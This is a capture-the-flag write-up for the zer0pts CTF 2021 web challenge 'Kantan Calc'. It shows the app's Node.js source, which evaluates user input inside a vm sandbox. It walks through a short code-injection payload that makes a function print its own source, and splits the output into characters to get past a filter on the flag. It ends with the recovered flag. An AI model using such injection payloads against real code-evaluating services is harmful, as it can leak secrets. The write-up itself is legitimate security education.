# zer0pts CTF 2021 – Kantan Calc

* **Category:** web
* **Points:** 135

## Challenge

> "Kantan" means simple or easy in Japanese.
> 
> http://web.ctf.zer0pts.com:8002/
> 
> author:st98

## Solution

The challenge gives you an [attachment](kantan_calc_a4f3130c72d9093ab206a29e27e40123.tar.gz) containing the source code: [app.js](kantan_calc/app.js).

```javascript
const express = require('express');
const path = require('path');
const vm = require('vm');
const FLAG = require('./flag');

const app = express();

app.set('views', path.join(__dirname, 'views'));
app.set('view engine', 'pug');

app.use(express.static(path.join(__dirname, 'public')));

app.get('/', function (req, res, next) {
  let output = '';
  const code = req.query.code + '';

  if (code && code.length < 30) {
    try {
      const result = vm.runInNewContext(`'use strict'; (function () { return ${code}; /* ${FLAG} */ })()`, Object.create(null), { timeout: 100 });
      output = result + '';
      if (output.includes('zer0pts')) {
        output = 'Error: please do not exfiltrate the flag';
      }
    } catch (e) {
      output = 'Error: error occurred';
    }
  } else {
    output = 'Error: invalid code';
  }

  res.render('index', { title: 'Kantan Calc', output });
});

app.get('/source', function (req, res) {
  res.sendFile(path.join(__dirname, 'app.js'));
});

module.exports = app;
```

The website is a some sort of calculator.

Even if several articles on how to escape `vm` sandbox can be found on the Internet, here the point is to dump the source code of the defined function.

Two constraints are present:
1. the payload must be lesser than 30 chars;
2. if the output contains `zer0pts`, so the starting part of the flag, it will be blocked.

This is a *code injection* challenge.

First of all, a JavaScript named function can print itself, with comments, if its name is returned.

```javascript
(function p() { return p; /* Comment. */ })()
```

The structure of the given script can be seen as something like `(x, y)()`.

If you try to exfiltrate the function source code in this way, you will be blocked by the check on the output content, because the output is converted to a string and checked for the presence of `zer0pts`.

In JavaScript you can convert a string to an array of chars with the following clause: `[...p]`. With this trick you could bypass the check on the content.

But you can't execute that clause directly on `p` because it `is not iterable`. So you have to convert it to a string with a concatenation.

Putting all together, you can have the following payload.

```javascript
},function p(){return[...p+1]
```

The flag is the following.

```
zer0pts{K4nt4n_m34ns_4dm1r4t1on_1n_J4p4n3s3}
```